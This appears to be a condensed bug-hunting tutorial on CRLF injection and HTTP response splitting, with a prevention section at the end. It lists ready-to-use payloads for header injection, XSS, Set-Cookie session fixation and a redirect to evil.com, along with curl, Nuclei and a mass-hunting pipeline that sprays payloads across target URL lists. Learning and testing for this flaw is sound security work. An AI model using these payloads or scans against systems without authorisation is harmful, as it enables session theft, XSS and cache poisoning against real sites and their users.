# : Master CRLF Injection — The Underrated Bug with Dangerous Potential
- Source: (May 12, 2025) — infosecwriteups.com
- HTTP response splitting via CRLF injection for XSS, cache poisoning, and log injection

## What is CRLF Injection?
CRLF (Carriage Return + Line Feed: `%0d%0a`) injection occurs when an attacker can inject newline characters into HTTP headers or response bodies. This splits the HTTP response, allowing request smuggling, XSS, cache poisoning, and log injection.

## Common Injection Points
```
Parameters: redirect, url, next, return, page
Headers: Location, Set-Cookie, X-Forwarded-For, Referer
Log files: User-Agent, Referer
```

## Testing Payloads
```
%0d%0a
%0d%0aInjected-Header: true
%0d%0a%0d%0a<html><script>alert(1)</script></html>
%0d%0aSet-Cookie: stolen_session=abc123; domain=.target.com
%0d%0aLocation: https://evil.com
%0d%0aContent-Length: 0
```

## Discovery Commands
```bash
# Custom Nuclei template (more effective than crlfuzz)
nuclei -t crlf-injection.yaml -l targets.txt

# Manual test
curl -s -I "https://target.com/page?param=test%0d%0aX-Injected:%20true"
# Check response for X-Injected header
```

## Impact Scenarios
1. **XSS via header injection**: Inject script into response headers → reflected XSS
2. **Session fixation**: Inject Set-Cookie header
3. **Cache poisoning**: Inject malicious content into CDN cache
4. **Log injection**: Fake log entries to frame administrators
5. **Request smuggling**: Split response to poison subsequent requests
6. **Firewall bypass**: Break WAF signatures by splitting payload across lines

## Mass Hunting
```bash
# gf patterns for CRLF-prone params
cat urls.txt | gf redirect | qsreplace "%0d%0aX-Injected:true" | httpx -silent -H "X-Injected" -mc 200
```

## Prevention
- Validate and sanitize all user input before including in headers
- Encode/remove CRLF characters (%0d, %0a, \r, \n)
- Use secure header-setting functions that prevent injection
- Never include user input directly in response headers
